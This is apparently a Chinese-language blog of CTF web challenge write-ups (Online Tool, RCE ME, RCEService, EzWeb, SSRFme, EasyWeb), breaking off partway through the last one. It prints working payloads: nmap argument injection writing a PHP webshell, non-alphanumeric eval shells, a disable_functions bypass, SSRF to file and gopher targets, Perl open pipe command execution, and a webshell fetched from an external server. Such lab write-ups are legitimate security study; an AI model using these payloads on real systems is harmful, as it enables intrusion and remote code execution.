<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;settings.php&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;host&#x27;</span>])):</span><br><span class="line">	<span class="keyword">if</span> (!defined(<span class="string">&#x27;WEB_SCANS&#x27;</span>)) &#123;</span><br><span class="line">        	<span class="keyword">die</span>(<span class="string">&#x27;Web scans disabled&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="variable">$host</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(stripos(<span class="variable">$host</span>,<span class="string">&#x27;php&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">	<span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line"> </span><br><span class="line">	<span class="variable">$filename</span> = substr(md5(time() . rand(<span class="number">1</span>, <span class="number">10</span>)), <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">	<span class="variable">$command</span> = <span class="string">&quot;nmap &quot;</span>. NMAP_ARGS . <span class="string">&quot; -oX &quot;</span> . RESULTS_PATH . <span class="variable">$filename</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$host</span>;</span><br><span class="line">	<span class="variable">$result_scan</span> = shell_exec(<span class="variable">$command</span>);</span><br><span class="line">	<span class="keyword">if</span> (is_null(<span class="variable">$result_scan</span>)) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Something went wrong&#x27;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: result.php?f=&#x27;</span> . <span class="variable">$filename</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>主要语句：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">command</span> = <span class="string">&quot;nmap &quot;</span>. NMAP_ARGS . <span class="string">&quot; -oX &quot;</span> . RESULTS_PATH . <span class="variable">$filename</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$host</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">result_scan = shell_exec(<span class="variable">$command</span>);</span></span><br></pre></td></tr></table></figure>
<p>带入之后相当于：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> nmap <span class="literal">-Pn</span> <span class="literal">-T4</span> <span class="operator">-F</span> -<span class="literal">-host</span><span class="literal">-timeout</span> <span class="number">1000</span>ms <span class="literal">-oX</span> xml/<span class="variable">$filename</span> <span class="variable">$host</span></span><br></pre></td></tr></table></figure>
<p><strong>方法一：直接读flag写入文件</strong></p>
<ul>
<li>-iL:从文件中加载目标</li>
<li>-oN:将扫描后的文件信息以“Normal”的形式输出存储</li>
</ul>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#x27; -iL /flag -oN flag.txt &#x27;</span><br></pre></td></tr></table></figure>


<blockquote>
<p>　-iL　　从inputfilename文件中读取扫描的目标。</p>
<p>　-oN   把扫描结果重定向到一个可读的文件logfilename中。</p>
</blockquote>
<p><strong>方法二</strong></p>
<p>payload 2 (单引号逃逸 类似 [BUUCTF 2018]Online Tool):<br><a href="https://www.anquanke.com/post/id/168093#h2-0">PHP-escapeshell-命令执行</a></p>
<blockquote>
<p><strong>escapeshellarg</strong> — 把字符串转码为可以在 shell 命令里使用的参数</p>
</blockquote>
<p><strong>功能</strong> ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)</p>
<blockquote>
<p><strong>escapeshellcmd</strong> — shell 元字符转义</p>
</blockquote>
<p>功能：<strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a href="http://php.net/manual/zh/function.exec.php">exec()</a> 或 <a href="http://php.net/manual/zh/function.system.php">system()</a> 函数，或者 <a href="http://php.net/manual/zh/language.operators.execution.php">执行操作符</a> 之前进行转义。</p>
<p>反斜线（\）会在以下字符之前插入： <em>&amp;#;`|\</em>?~&lt;&gt;^()[]{}$<em>, <em>\x0A</em> 和 <em>\xFF\</em>。 *’</em> 和 <em>“</em> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <em>%</em> 和 <em>!</em> 字符都会被空格代替。</p>
<p>详细分析一下这个过程：</p>
<ol>
<li><p>传入的参数是</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>&#x27; -v -d a=<span class="number">1</span></span><br></pre></td></tr></table></figure></li>
<li><p>由于<code>escapeshellarg</code>先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span>\<span class="string">&#x27;&#x27;</span> -v -d <span class="attribute">a</span>=1&#x27;</span><br></pre></td></tr></table></figure></li>
<li><p>经过<code>escapeshellcmd</code>针对第二步处理之后的参数中的<code>\</code>以及<code>a=1&#39;</code>中的单引号进行处理转义之后的效果如下所示：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span>\\<span class="string">&#x27;&#x27;</span> -v -d <span class="attribute">a</span>=1\&#x27;</span><br></pre></td></tr></table></figure></li>
<li><p>由于第三步处理之后的payload中的<code>\\</code>被解释成了<code>\</code>而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分</p>
</li>
</ol>
<p>所以这个payload可以简化为<code>curl 127.0.0.1\ -v -d a=1&#39;</code>，即向<code>127.0.0.1\</code>发起请求，POST 数据为<code>a=1&#39;</code>。</p>
<p>因为过滤了php,可以用phtml绕过，里面的内容用短标签</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">host=<span class="string">&#x27;&lt;?=eval($_GET[a]);?&gt; -oG flag.phtml &#x27;</span></span><br></pre></td></tr></table></figure>
<p>先进过escapeshellarg 函数<br>变为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>\<span class="string">&#x27;&#x27;</span> <span class="meta">&lt;?=</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]);<span class="meta">?&gt;</span> -oG flag.phtml<span class="string">&#x27;\&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></table></figure>
<p>再经过escapeshellcmd函数<br>变为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>\\<span class="string">&#x27;&#x27;</span> \&lt;\?= @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]);\?\&gt; -oG flag.phtml<span class="string">&#x27;\\&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>可以发现单引号已经全部闭合</p>
<p>可以看成</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">\\ <span class="meta">&lt;?=</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]);<span class="meta">?&gt;</span> -oG flag.phtml \\</span><br></pre></td></tr></table></figure>




<h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><p><strong>无字母数字绕过</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>payload:</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">?code=$<span class="symbol">_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;$<span class="symbol">_</span>&#125;[<span class="symbol">_</span>]($&#123;$<span class="symbol">_</span>&#125;[<span class="symbol">__</span>]);&amp;<span class="symbol">_</span>=assert&amp;<span class="symbol">__</span>=<span class="built_in">eval</span>($_POST[a])</span><br></pre></td></tr></table></figure>
<p>蚁剑链接 无权限读取readflag </p>
<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank">bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>将github中一下两个文件 上传有有权限的目录，在这里选择/tmp</p>
<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc.php">bypass_disablefunc.php</a></p>
<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc_x64.so">bypass_disablefunc_x64.so</a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?code=<span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;<span class="variable">$&#123;$_&#125;</span>[_](<span class="variable">$&#123;$_&#125;</span>[__]);&amp;_=assert&amp;__=var_dump(eval(<span class="variable">$_GET</span>[a]))&amp;a=include(<span class="string">&#x27;/tmp/bypass_disablefunc.php&#x27;</span>);&amp;cmd=..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/readflag&amp;outpath=/</span>tmp<span class="regexp">/123.txt&amp;sopath=/</span>tmp/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>


<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p><strong>preg_match正则最大回溯绕过+换行绕过</strong></p>
<p>payload1:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;xxxxxx&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="string">&quot;a&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">res = requests.post(url, data=&#123;<span class="string">&quot;cmd&quot;</span>:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
<p>payload2:</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?c</span>md=&#123;%0A<span class="string">&quot;cmd&quot;</span><span class="symbol">:<span class="string">&quot;/bin/cat /home/rceservice/flag&quot;</span>%</span>0A&#125;</span><br></pre></td></tr></table></figure>
<p>这里cat的路径要写 /bin/cat是因为通过查看源代码：<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code>，可以发现jail应用于当前环境，cat不在当前配置的环境变量中，需要我们自行写完整路径</p>
<p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank">use-pcre-backtrack-limit-to-bypass-restrict</a></p>
<h2 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h2><p><strong>SSRF 最基础的漏洞场景</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.xxx.com<span class="regexp">/image.php?image=http:/</span><span class="regexp">/www.xxc.com/</span>a.jpg</span><br></pre></td></tr></table></figure>
<p>这样的链接就是有可能存在ssrf的,因为服务器有可能是向本机发起请求来获取相应的图片</p>
<p>倘若没有对image参数进行任何的检测,就可以构造其他的请求</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.xxx.com/image.php?image=http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">22</span></span><br><span class="line">http:<span class="regexp">//</span>www.xxx.com/image.php?image=file:<span class="regexp">//</span><span class="regexp">/etc/pass</span>wd</span><br><span class="line">http:<span class="regexp">//</span>www.xxx.com/image.php?image=dict:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">22</span>/data:data2 (dict可以向服务端口请求data data2)</span><br><span class="line">http:<span class="regexp">//</span>www.xxx.com/image.php?image=gopher:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">2233</span>/_test (向<span class="number">2233</span>端口发送数据test,同样可以发送POST请求)</span><br></pre></td></tr></table></figure>
<p>做题四步走：</p>
<ol>
<li>./?secret</li>
<li>用http协议配合bp进行内网主机探测</li>
<li>端口扫描，发现6379端口（redis），redis未授权访问的漏洞（通过传gopher在根目录下自动生成个文件shell.php）</li>
<li>gopherus制造shell</li>
</ol>
<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p><strong>知识点： basename()函数的使用</strong></p>
<blockquote>
<p>With the default locale setting “C”, basename() drops non-ASCII-chars at the beginning of a filename.</p>
</blockquote>
<p>该函数会去掉文件名开头的非ASCII值（%80 — %ff）</p>
<blockquote>
<p>var_dump(basename(“xffconfig.php”)); // =&gt; config.php var_dump(basename(“config.php/xff”)); // =&gt; config.php</p>
</blockquote>
<p>题目的关键代码其实只有上半部分</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>根据题目提示，flag在config.php文件中，通过<code>?source</code>读取<code>$_SERVER[&#39;PHP_SELF&#39;]</code>返回的是当前正在执行的脚本的名字比如说<code>basename(&quot;/path/home.php&quot;) -&gt; home.php</code>,</p>
<p><strong>当我访问index.php时，我可以在后面加上一些东西，比如/index.php/config.php，这样仍然访问的是index.php，但经过basename()后，传进highlight_file()函数的文件名就变成了config.php，如果能绕过那个正则，就可以得到config.php源码了，而$_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用/index.php/config.php?source来读取flag。</strong></p>
<p>paylaod:</p>
<blockquote>
<p>/index.php/config.php/%80?source</p>
</blockquote>
<h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><p>完全考在了知识盲区，跟着wp复现了一遍</p>
<p>知识点：</p>
<ol>
<li><p> perl脚本中GET命令执行漏洞</p>
</li>
<li><p> file 协议利用 open 命令执行</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$http_x_headers</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);  <span class="comment">// explode(separator,string)函数把以separator为分隔字符串将字符串打散为数组。</span></span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$http_x_headers</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . md5(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);   <span class="comment">// “REMOTE_ADDR”为正在浏览当前页面用户的 IP 地址。 </span></span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    @chdir(<span class="variable">$sandbox</span>);     <span class="comment">// 改变当前的目录到$sandbox</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = shell_exec(<span class="string">&quot;GET &quot;</span> . escapeshellarg(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]));     <span class="comment">// escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数</span></span><br><span class="line">    <span class="variable">$info</span> = pathinfo(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);  <span class="comment">// pathinfo() 函数以数组的形式返回文件路径的信息。</span></span><br><span class="line">    <span class="variable">$dir</span>  = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, basename(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>]));   <span class="comment">// basename() 函数返回路径中的文件名部分。</span></span><br><span class="line">    @mkdir(<span class="variable">$dir</span>);</span><br><span class="line">    @chdir(<span class="variable">$dir</span>);</span><br><span class="line">    @file_put_contents(basename(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="comment">// 以上代码大致为，调用GET（git）命令来执行从url获取的参数，从该url获取内容， 然后按照filename新建文件，写入git到的结果。</span></span><br></pre></td></tr></table></figure>
<p>根据源码可以发现php会对传过去的参数用escapeshellarg函数过滤。<strong>先创建一个目录sandbox/md5(orange+ip)，然后执行GIT $_GET[‘url’]，然后会创建文件夹，并将执行GIT $_GET[‘url’]后的结果放在该文件夹下面filename传过去的文件中。</strong></p>
<p><strong>如果GET后面跟路径的话，可以直接获取文件或目录内容</strong></p>
<blockquote>
<p>GET   /etc/passwd</p>
<p>GET   /      读取根目录</p>
</blockquote>
<p><strong>Perl语言的open函数</strong></p>
<blockquote>
<p>在Perl中可以用open或者sysopen函数来打开文件进行操作，这两个函数都需要通过一个文件句柄（即文件指针）来对文件进行读写定位等操作</p>
</blockquote>
<p>1：读：open(文件句柄，”&lt;文件名”)/open(文件句柄，”文件名”)，前提文件必须已经存在，否则会返回0，出错信息在$!中。<br>2：写：open(文件句柄，”&gt;文件名”)，文件如果不存在，那么创建之，如果存在，内容被清空，长度截为0，$!中有出错信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@npfs:~&#x2F;test# cat a.pl </span><br><span class="line">open(FD, &quot;|id&quot;);</span><br><span class="line">print &lt;FD&gt;;</span><br><span class="line">root@iZ285ei82c1Z:~&#x2F;test# perl a.pl </span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line"></span><br><span class="line">root@npfs:~&#x2F;test# cat test.pl </span><br><span class="line">open(FD, &quot;whoami|&quot;);</span><br><span class="line">print &lt;FD&gt;;</span><br><span class="line">root@iZ285ei82c1Z:~&#x2F;test# perl test.pl </span><br><span class="line">moxiaoxi</span><br></pre></td></tr></table></figure>


<p>当GET使用file协议的时候就会调用到perl的open函数</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Perl saw <span class="keyword">that</span> your “<span class="built_in">file</span>” ended <span class="keyword">with</span> a “pipe” (verticalbar) <span class="built_in">character</span>. So <span class="keyword">it</span> interpreted <span class="keyword">the</span> “<span class="built_in">file</span>” <span class="keyword">as</span> a command <span class="keyword">to</span> be executed, <span class="keyword">and</span> interpreted <span class="keyword">the</span> command’s output <span class="keyword">as</span> <span class="keyword">the</span> “<span class="built_in">file</span>”&#x27;s <span class="built_in">contents</span>. The command <span class="keyword">is</span> “who” (which prints information <span class="keyword">on</span> currently logged-<span class="keyword">in</span> users). If you execute <span class="keyword">that</span> command, you will see <span class="keyword">that</span> <span class="keyword">the</span> output <span class="keyword">is</span> exactly what <span class="keyword">the</span> Perl program gave you.</span><br><span class="line"></span><br><span class="line">翻译过来意思是：</span><br><span class="line">perl函数看到要打开的文件名中如果以管道符（键盘上那个竖杠）结尾，就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行，并且将命令的执行结果作为这个文件的内容写入。这个命令的执行权限是当前的登录者。如果你执行这个命令，你会看到perl程序运行的结果。</span><br></pre></td></tr></table></figure>


<p><strong>perl脚本中GET命令执行漏洞：（前提是文档需要存在，若存在，才会触发最终的代码执行）</strong></p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">GET ’file:id|<span class="string">&#x27;</span></span><br><span class="line"><span class="string">touch &#x27;</span>id|<span class="string">&#x27;</span></span><br><span class="line"><span class="string">GET ’file:id|&#x27;</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br></pre></td></tr></table></figure>
<p><strong>在perl下，如果open的第二个参数（path）可控，我们就能进行任意代码执行。综合看起来像是一个把文件名拼接入命令导致的命令执行。</strong></p>
<p>payload:</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">首先得满足前面的文件存在, 才会继续到open语句, 所以在执行命令前得保证有相应的同名文件:</span><br><span class="line">?url=(任意)&amp;filename=bash -c <span class="regexp">/readflag| 先新建一个名为“bash -c /</span>readflag|”的文件</span><br><span class="line">?url=<span class="keyword">file</span>:bash -c <span class="regexp">/readflag|&amp;filename=aaa 再利用GET执行bash -c /</span>readflag保存到aaa文件</span><br><span class="line">访问sandbox<span class="regexp">/md5/</span>aaa（得到flag）</span><br></pre></td></tr></table></figure>


<p>其实如果对于这个open不理解的化=话还有更简单的做法，直接在自己的vps根目录下写一个木马文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>txt</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>将这个木马文件写入到自定义的123.php 中</p>
<blockquote>
<p><a href="http://ae1dea96-9018-4671-a599-2f80eeb7a409.node3.buuoj.cn/?url=http://xxx/1.txt&amp;filename=123.php">http://ae1dea96-9018-4671-a599-2f80eeb7a409.node3.buuoj.cn/?url=http://xxx/1.txt&amp;filename=123.php</a></p>
</blockquote>
<p>蚁剑连接即可</p>
<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p>感觉挺复杂的一题</p>
<p><strong>知识点：</strong></p>
<p><strong>1.无数字字母shell</strong><br><strong>2.利用.htaccess上传文件</strong><br><strong>3.绕过open_basedir</strong></p>
<p>题目源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = substr(<span class="variable">$name</span>, strrpos(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        print_r(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = count_chars(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>第一关</p>
<blockquote>
<p>首先判断是否从GET方法获取 “ _ “ 参数的值</p>
<p>然后通过 strlen() 函数对GET方法对该值进行长度检测 , 如果字符串长度大于 18 就拦截信息</p>
<p>接下来通过 preg_match() 正则过滤该值中的敏感字符 , 这个正则表达式非常严谨 , 过滤了绝大部分的可写字符</p>
